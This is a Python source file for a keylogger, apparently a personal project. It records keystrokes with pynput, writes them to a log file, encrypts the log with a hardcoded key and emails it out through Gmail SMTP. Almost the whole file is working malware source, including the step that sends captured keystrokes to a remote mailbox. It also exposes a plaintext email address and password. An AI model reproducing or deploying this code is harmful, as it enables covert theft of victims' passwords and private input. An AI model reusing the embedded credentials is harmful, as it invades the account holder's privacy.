# imports
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib


from pynput.keyboard import Key, Listener


from cryptography.fernet import Fernet

count = 0
keys = []

key_info = "key_log.txt"
file_path = ("C:\\Users\\zacko\\PycharmProjects\\keylogger")
extend = "\\"

key_info_encrypt = "key_log_e.txt"

key = "cNfqq-aQD8Ba2qGu_nXJOv0yUTl-ygpiKcmAW7aWzBY="
email_user = "zackornberggithub@gmail.com"
email_pass = "8w7O^aywLsT1"
email_destination = "zackornberggithub@gmail.com"  # for functional purposes this would be the receiving address


# start of basic key logger
def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_to_file(keys)
        keys = []


def write_to_file(keys):
    with open(file_path + extend + key_info, "a") as file:
        for key in keys:
            key_NQ = str(key).replace("'", "")  # removed single quotes in file for charaters pressed
            if key_NQ.find("space") > 0:  # space adds a new line in file
                file.write('\n')
                file.close()
            elif key_NQ.find("Key") == -1:
                file.write(key_NQ)
                file.close()


def on_release(key):  # stop code is esc is pressed
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


# end of basic key logger

#start of email functionality

def send_email(file_name, attachment, receiver_addr):
    email_address = email_user

    message = MIMEMultipart()
    message['From'] = email_address
    message['To'] = email_destination
    message['Subject'] = "Key Log File"

    body = "Body of email"  # placeholder body
    message.attach(MIMEText(body, 'plain'))
    file_name = file_name
    attachment = open(attachment, 'rb')
    pl = MIMEBase('application', 'octet-stream')

    pl.set_payload((attachment).read())
    encoders.encode_base64(pl)
    pl.add_header('Content', "attachment; filename = %s" % file_name)
    message.attach(pl)

    email_server = smtplib.SMTP('smtp.gmail.com', 587)
    email_server.starttls()

    email_server.login(email_address, email_pass)

    text = message.as_string()
    email_server.sendmail(email_address, email_destination, text)
    email_server.quit()

# end of email functionality


# encryption

with open(file_path + extend + key_info, 'rb') as f:
    data = f.read()
fernet = Fernet(key)
encrypted = fernet.encrypt(data)

with open(file_path + extend + key_info_encrypt, 'wb') as ef:
    ef.write(encrypted)
send_email(key_info_encrypt, file_path + extend + key_info_encrypt, email_destination)
